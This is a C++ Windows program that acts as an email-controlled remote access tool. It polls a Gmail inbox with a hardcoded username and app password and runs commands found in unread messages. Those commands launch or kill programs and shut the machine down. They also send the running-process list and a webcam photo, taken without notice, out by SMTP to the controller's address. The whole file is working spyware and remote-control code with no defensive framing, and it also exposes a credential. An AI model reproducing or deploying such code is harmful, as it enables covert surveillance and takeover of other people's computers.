#include <iostream>
#include <string>
#include <curl/curl.h>
#include <opencv2/opencv.hpp>
#include <vector>
#include <regex>
#include <windows.h>
#include <shellapi.h>
#include <sstream>
#include <fstream>
#include <windows.h>
#include <cstdint>
#include <cstdlib>    // for system()
#include <algorithm>  // for remove()
#include <tlhelp32.h>

using namespace std;

// Constants should ideally be in a config file or environment variables
const string app_password = "qljblnttdobhrtfe";
const string gmail_username = "serverbottestmmt@gmail.com";
const string ca_bundle_path = "C:/curl/cacert.pem";

// Callback function for writing received data
size_t WriteCallback(char* ptr, size_t size, size_t nmemb, void* userdata) {
  size_t totalSize = size * nmemb;
  string* buffer = static_cast<string*>(userdata);
  buffer->append(ptr, totalSize);
  return totalSize;
}

string base64_decode(const string& encoded_data) {
  // Create temporary files with unique names to avoid conflicts
  const string temp_in =
      "temp_base64_" + to_string(GetCurrentProcessId()) + ".txt";
  const string temp_out =
      "decoded_output_" + to_string(GetCurrentProcessId()) + ".txt";

  ofstream tempIn(temp_in);
  if (!tempIn) {
    cerr << "Failed to create temporary input file" << endl;
    return "";
  }
  tempIn << encoded_data;
  tempIn.close();

  string command =
      "certutil -decode \"" + temp_in + "\" \"" + temp_out + "\" > nul";
  int result = system(command.c_str());
  if (result != 0) {
    cerr << "certutil failed with error code: " << result << endl;
    remove(temp_in.c_str());
    return "";
  }

  ifstream resultFile(temp_out);
  if (!resultFile) {
    cerr << "Failed to open decoded output file" << endl;
    remove(temp_in.c_str());
    remove(temp_out.c_str());
    return "";
  }

  stringstream ss;
  ss << resultFile.rdbuf();
  resultFile.close();

  remove(temp_in.c_str());
  remove(temp_out.c_str());

  return ss.str();
}

void list_programs() {
  const string filename = "process_list.txt";
  ofstream outFile(filename);
  if (!outFile) {
    cerr << "Failed to create output file." << endl;
    return;
  }

  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE) {
    cerr << "Failed to create process snapshot." << endl;
    return;
  }

  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  outFile << "=== Running Processes ===" << endl;
  if (Process32First(hSnapshot, &pe32)) {
    do {
      // Convert WCHAR to std::string (ASCII-safe)
      string processName;
      for (int i = 0; pe32.szExeFile[i] != '\0'; ++i) {
        processName += static_cast<char>(pe32.szExeFile[i]);
      }

      outFile << "- " << processName << " (PID: " << pe32.th32ProcessID << ")" << endl;

    } while (Process32Next(hSnapshot, &pe32));
  } else {
    outFile << "Failed to retrieve process list." << endl;
  }

  CloseHandle(hSnapshot);
  outFile << "==========================" << endl;
  outFile.close();

  cout << "Process list written to: " << filename << endl;
}

void send_email_with_attachment(const std::string& toEmail, const std::string& subject, const std::string& body, const std::string& filepath) {
    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "Failed to initialize curl" << std::endl;
        return;
    }

    struct curl_slist* recipients = nullptr;
    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part = nullptr;

    curl_easy_setopt(curl, CURLOPT_USERNAME, gmail_username.c_str());
    curl_easy_setopt(curl, CURLOPT_PASSWORD, app_password.c_str());
    curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
    curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
    curl_easy_setopt(curl, CURLOPT_CAINFO, ca_bundle_path.c_str());
    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, gmail_username.c_str());

    recipients = curl_slist_append(recipients, toEmail.c_str());
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    // Create email headers part
    part = curl_mime_addpart(mime);
    std::string headers = "To: " + toEmail + "\r\n"
                         "From: " + gmail_username + "\r\n"
                         "Subject: " + subject + "\r\n"
                         "MIME-Version: 1.0\r\n";
    curl_mime_data(part, headers.c_str(), CURL_ZERO_TERMINATED);
    curl_mime_type(part, "text/plain");

    // Add body part
    part = curl_mime_addpart(mime);
    curl_mime_data(part, body.c_str(), CURL_ZERO_TERMINATED);
    curl_mime_type(part, "text/plain");

    // Add attachment part
    part = curl_mime_addpart(mime);
    curl_mime_filedata(part, filepath.c_str());
    curl_mime_filename(part, "captured_photo.jpg");
    curl_mime_type(part, "image/jpeg");
    curl_mime_encoder(part, "base64");  // Ensure base64 encoding

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
    } else {
        std::cout << "Email sent successfully!" << std::endl;
    }

    curl_mime_free(mime);
    curl_slist_free_all(recipients);
    curl_easy_cleanup(curl);
}

void send_picture() {
  char temp_path[MAX_PATH];
  GetTempPathA(MAX_PATH, temp_path);

  string image_path = string(temp_path) + "captured_photo.jpg";

  // Open default camera (0)
  cv::VideoCapture cap(0);
  if (!cap.isOpened()) {
    cerr << "Failed to open webcam!" << endl;
    return;
  }

  cv::Mat frame;
  cap >> frame;

  if (frame.empty()) {
    cerr << "Failed to capture image!" << endl;
    return;
  }

  // Save image to file
  bool saved = cv::imwrite(image_path, frame);
  if (!saved) {
    cerr << "Failed to save image!" << endl;
    return;
  }
  cout << "Image saved successfully to: " << image_path << endl;

  // Send it via email
  send_email_with_attachment(
    "serverbottestmmt@gmail.com",
    "Webcam Photo",
    "Here is a photo taken from the webcam.",
    image_path
  );
}


void shutdown_program(const string& process_name) {
  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE) {
    cerr << "Failed to create process snapshot." << endl;
    return;
  }

  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (Process32First(hSnapshot, &pe32)) {
    do {
      if (_stricmp(pe32.szExeFile, process_name.c_str()) == 0) {
        HANDLE hProcess =
            OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
        if (hProcess) {
          TerminateProcess(hProcess, 0);
          CloseHandle(hProcess);
          cout << "Terminated process: " << process_name << endl;
          CloseHandle(hSnapshot);
          return;
        }
      }
    } while (Process32Next(hSnapshot, &pe32));
  }

  CloseHandle(hSnapshot);
  cerr << "Process not found: " << process_name << endl;
}

void execute_command(const string& command) {
  cout << "[Command]: " << command << endl;

  // Trim whitespace from command
  string trimmed_cmd = command;
  trimmed_cmd.erase(trimmed_cmd.begin(),
                    find_if(trimmed_cmd.begin(), trimmed_cmd.end(),
                            [](int ch) { return !isspace(ch); }));
  trimmed_cmd.erase(find_if(trimmed_cmd.rbegin(), trimmed_cmd.rend(),
                            [](int ch) { return !isspace(ch); })
                        .base(),
                    trimmed_cmd.end());

  if (trimmed_cmd.empty()) {
    cout << "Empty command received" << endl;
    return;
  }

  if (trimmed_cmd.find("start_program") == 0) {
    string prog = trimmed_cmd.substr(13);  // after "start_program"
    prog.erase(prog.begin(), find_if(prog.begin(), prog.end(), [](int ch) {
                 return !isspace(ch);
               }));  // trim left

    if (!prog.empty()) {
      cout << "Starting program: " << prog << endl;
      HINSTANCE result =
          ShellExecuteA(NULL, "open", prog.c_str(), NULL, NULL, SW_SHOWDEFAULT);
      if (reinterpret_cast<INT_PTR>(result) <= 32) {
        cerr << "Failed to start program. Error code: "
             << reinterpret_cast<INT_PTR>(result) << endl;
      }
    }
  } else if (trimmed_cmd.find("shutdown_program") == 0) {
    string proc = trimmed_cmd.substr(16);
    proc.erase(proc.begin(), find_if(proc.begin(), proc.end(),
                                     [](int ch) { return !isspace(ch); }));
    if (!proc.empty()) {
      shutdown_program(proc);
    }
  }else if(trimmed_cmd.find("get_picture") == 0)
  {
    send_picture();
  } 
  else if (trimmed_cmd.find("list_program") == 0) {
  list_programs();
  Sleep(1000);
ifstream test_file("process_list.txt");
if (test_file.good()) {
    test_file.close();
    send_email_with_attachment("serverbottestmmt@gmail.com",
                                "Running Process List",
                                "Attached is the current process list.",
                                "process_list.txt");
} else {
    cerr << "Failed to create process list file" << endl;
}
}
 else if (trimmed_cmd.find("shutdown") == 0) {
    cout << "Initiating system shutdown..." << endl;
    if (system("shutdown /s /t 0") != 0) {
      cerr << "Shutdown command failed" << endl;
    }
  } else {
    cout << "Unknown command: " << trimmed_cmd << endl;
  }
}

void test_command_execution() {
  cout << "Testing command execution..." << endl;

  // Test valid commands
  execute_command("start_program notepad.exe");

  // Test invalid commands
  execute_command("invalid_command");
  execute_command("   ");  // empty after trim
}

void send_to_server(const string& cmd) {
  WSADATA wsa;
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;

  SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
  sockaddr_in serverAddr{};
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(8888);
  inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

  if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
    cerr << "Connection to server failed" << endl;
    closesocket(clientSocket);
    WSACleanup();
    return;
  }

  send(clientSocket, cmd.c_str(), cmd.length(), 0);

  char buffer[1024] = {};
  int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
  if (bytesReceived > 0) {
    cout << "[Server replied] " << buffer << endl;
  }

  closesocket(clientSocket);
  WSACleanup();
}

string extract_plain_text_from_email(const string& rawEmail) {
  smatch match;

  // Step 1: Extract text/plain section
  regex plainTextRe(R"(Content-Type:\s*text/plain.*?\r\n\r\n([\s\S]*?)\r\n--)",
                    regex::icase);
  if (regex_search(rawEmail, match, plainTextRe)) {
    string body = match[1].str();

    // Trim leading/trailing whitespace
    body.erase(0, body.find_first_not_of(" \r\n"));
    body.erase(body.find_last_not_of(" \r\n") + 1);

    return body;
  }

  // Fallback: if no plain text, attempt whole email body
  return rawEmail;
}

void check_email_commands() {
  CURL* curl = curl_easy_init();
  if (!curl) {
    cerr << "Failed to initialize curl" << endl;
    return;
  }

  // Add this to enable verbose IMAP logging
  curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

  // Set common curl options
  curl_easy_setopt(curl, CURLOPT_USERNAME, gmail_username.c_str());
  curl_easy_setopt(curl, CURLOPT_PASSWORD, app_password.c_str());
  curl_easy_setopt(curl, CURLOPT_USE_SSL, static_cast<long>(CURLUSESSL_ALL));
  curl_easy_setopt(curl, CURLOPT_CAINFO, ca_bundle_path.c_str());
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

  // Search for unseen emails
  string readBuffer;
  // curl_easy_setopt(curl, CURLOPT_URL,
  // "imaps://imap.gmail.com/INBOX?SEARCH=UNSEEN");
  curl_easy_setopt(curl, CURLOPT_URL, "imaps://imap.gmail.com/INBOX");
  curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "UID SEARCH UNSEEN");
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

  CURLcode res = curl_easy_perform(curl);
  if (res != CURLE_OK) {
    cerr << "Error when searching emails: " << curl_easy_strerror(res) << endl;
    curl_easy_cleanup(curl);
    return;
  }

  // Extract email IDs
  vector<string> ids;
  regex idRegex(R"(\b\d+\b)");
  sregex_iterator it(readBuffer.begin(), readBuffer.end(), idRegex);
  sregex_iterator end;

  for (; it != end; ++it) {
    ids.push_back(it->str());
  }

  if (ids.empty()) {
    cout << "No new emails found." << endl;
    curl_easy_cleanup(curl);
    return;
  }

  // Process each email
  for (const string& id : ids) {
    readBuffer.clear();

    string fetchUrl = "imaps://imap.gmail.com/INBOX/;UID=" + id;
    curl_easy_setopt(curl, CURLOPT_URL, fetchUrl.c_str());
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST,
                     nullptr);  // clear previous custom command

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
      cerr << "Failed to fetch email UID " << id << ": "
           << curl_easy_strerror(res) << endl;
      continue;
    }

    cout << "=== FETCHED RAW EMAIL ===\n"
         << readBuffer << "\n=========================\n";
    string decoded = extract_plain_text_from_email(readBuffer);
    cerr << "=== DECODED ===\n" << decoded << "\n=================\n";

    // Process commands
    istringstream iss(decoded);
    string line;
    while (getline(iss, line)) {
      cout << line << '\n';
      if (line.find("start_program") != string::npos ||
          line.find("shutdown") != string::npos ||
          line.find("COMMAND") != string::npos ||
          line.find("list_program") != string::npos ||
          line.find("get_picture") != string::npos) {
        execute_command(line);
      }
    }
  }

  curl_easy_cleanup(curl);
}

int main() {
  // Initialize curl globally
  curl_global_init(CURL_GLOBAL_DEFAULT);

  check_email_commands();
  // test_command_execution();

  // Cleanup curl
  curl_global_cleanup();

  system("pause");
  return 0;
}